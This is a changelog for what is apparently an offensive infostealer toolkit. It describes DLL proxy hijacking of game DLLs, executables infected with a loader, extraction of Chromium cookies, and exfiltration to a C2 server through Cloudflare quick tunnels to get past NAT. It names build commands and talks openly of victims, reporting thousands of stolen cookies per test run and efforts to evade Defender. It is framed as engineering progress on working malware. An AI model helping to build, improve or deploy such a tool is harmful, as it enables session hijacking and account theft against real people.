## What's New

### v16 -- native DLL proxies, reliable staging and loopback tunnels (current)

**Native x64 DLL proxy staging.** `python build.py proxy native.dll --c2 URL` parses the
original PE32+ export table, generates forwarders for named, aliased and ordinal-only
exports, and stages a proxy with the original filename plus the untouched original as
`native_ck.dll`. `src/proxy.cpp` starts the payload on a worker instead of running browser
extraction inside `DllMain`; the original DLL remains available through every forwarded
ordinal. The command verifies the linked export table and writes only to a staging folder,
never over the installed game DLL. A real x64 fixture loaded the proxy, resolved named and
ordinal-only imports, returned the expected values, and delivered 1707 cookies through its
C2 worker. x86, .NET, malformed images and unsupported export
collisions are rejected instead of producing a broken proxy.

**The tunnel no longer touches the firewall.** Its listener binds only to `127.0.0.1`,
because cloudflared is the sole local peer. Direct listeners still bind `0.0.0.0` and now
report a failed inbound rule with the exact elevated `netsh` command. Manually supplied
remote HTTP and HTTPS endpoints both skip the local listener. GUI port changes preserve
the URL scheme, path, query and fragment instead of silently converting HTTPS to HTTP.

**Staging fails closed.** `cklog/stage.py` is the single loader patcher used by `auto.py`
and `pick.py`. A missing/ambiguous sentinel or a C2 URL over 255 UTF-8 bytes aborts output;
URLs are never truncated. Existing host trailers are stripped only when `CKLG` is exactly
at EOF and its length is in range. `auto.py` now delegates compiler detection to
`cklog/toolchain.py` rather than maintaining a second toolchain implementation.

**Native I/O and extraction hardening.** The loader uses complete read/write loops and
publishes the restored host only after the replacement is fully written; failed restoration
keeps the backup and aborts the payload. Chromium temporary database names are unique per
process, WAL/SHM companions are cleaned up, and duplicated browser handles are read with
explicit `OVERLAPPED` offsets so browser-owned file pointers are not moved. Plain HTTP and
Schannel status lines handle fragmented receives. Local loot is written completely to a
temporary file and atomically published, never replacing valid loot with malformed JSON.

**Less repeated work.** The AES provider is cached per process, contiguous unescaped JSON
bytes are emitted in batches, loader sentinel patching is one pass, and `src/gen.ps1` caches
its 256 formatted byte literals. The loader's fake Microsoft/Font Cache version metadata
was replaced with neutral application-launcher metadata.

Bench: 46 unit tests, full clang-cl build and artifact verification pass. A real standalone
run delivered 1707 cookies and restored `where.exe` byte-for-byte; folder mode through a
public quick tunnel delivered 1707 cookies with a loopback-only listener and no firewall
rule. A native test host validated named, aliased and ordinal-only calls through the staged
proxy. Local Defender scans found no threats in the rebuilt loader, payload, infected test
EXE or proxy DLL; this is a local static result, not a cloud-reputation guarantee.

### v15 -- tunnel C2, installers that actually verify

**`--tunnel`: a public https C2 with no VPS and no port-forward.** `auto.py` starts
`cloudflared` in quick-tunnel mode in front of the local listener, waits for the
`https://<name>.trycloudflare.com/` URL, probes `https` `/health` through it, and only then
builds the payload with that URL. Cloudflare terminates TLS at the edge and forwards plain
HTTP to `127.0.0.1:<port>`, so the listener stays untouched while the payload still runs its
own schannel handshake against a publicly trusted chain. This is the CGNAT answer: the
victim dials out to 443 like any browser, and nothing has to accept inbound connections at
the attacker's line.

Bench proof: infected `where.exe` with the tunnel URL embedded delivered **4010 cookies in
2 s** through the public endpoint, attributed to the victim host, with the listener logging
the POST and the `/health` probe answering before the build. The tunnel process dies with
`auto.py`; a killed tunnel costs late victims exactly like a killed VPS listener.

**The picker was wired to the tunnel and rebuilt.** `auto.py`'s GUI gained a
`Tunnel HTTPS (cloudflared)` checkbox; when it is on, the Port field owns the listener and
the public URL replaces the C2 field (a loopback C2 in that field is no longer rejected,
because the tunnel is the endpoint). The checkbox is authoritative once the dialog opens --
`--tunnel` only pre-checks it. The same switch went into `run_one`, so the interactive
`gui` command behaves like the CLI. Layout: the native Windows theme, group boxes instead
of stacked 50px indents, standard buttons, one status line for LAN/public/port/test
results, and the relay state inline. No custom palette, no card dashboard.

**`install.bat` was hiding failures.** `if %errorlevel%==1` only matches exit code 1, so a
pip or winget failure that returned 2+ was treated as success; all checks now use
`if errorlevel 1`. Parentheses in echoed flag names (`(--no-tools)`) closed the surrounding
`if (...)` block early, which silently skipped the whole build/verify step -- escaped, and
step 7 now always runs `build.py verify` plus the 24 unit tests.

**Both installers gained the missing pieces.** `cloudflared` is downloaded (Windows:
`%LOCALAPPDATA%\cloudflared`, Linux: `~/.local/bin`, per-arch) or skipped with `--no-tunnel`;
dependency checks import `cryptography`/`websocket` instead of trusting `pip show` (which
returns 0 even when a package is missing); `install.bat` proves the `python` it found is a
real interpreter and not the Store alias; `install.sh` verifies imports and `build.py verify`
against the prebuilt `bin/`; every `--check` mode reports and exits nonzero when something
required is absent. `install.ps1` matches the batch flow (`-Check`, `-Build`, `-NoBuild`,
`-NoTunnel`).

### v14 -- key stage: probe the directory, not the token